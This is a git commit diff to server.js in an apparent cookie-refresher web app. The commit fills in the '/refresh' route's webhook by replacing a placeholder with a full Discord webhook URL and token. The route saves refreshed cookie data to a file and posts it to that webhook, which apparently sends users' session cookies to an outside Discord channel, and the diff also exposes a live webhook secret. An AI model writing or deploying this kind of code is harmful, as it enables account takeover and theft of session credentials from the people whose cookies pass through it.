6dcac0a15788e8802dd84195b861ce82b35896fe
mathtigerhelp <131611360+mathtigerhelp@users.noreply.github.com>
2023-10-28 22:04:07 -0400

    Update server.js

--- server.js
+++ server.js
@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'HOOK HERE';
+    const webhookURL = 'https://discord.com/api/webhooks/1166860650664955988/hc6Qi4VmKVbzzLfhqCrXjR7lhU_PzA29F9eg82jhQCn570ze156kVJfqT5dTyDTNimBS';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
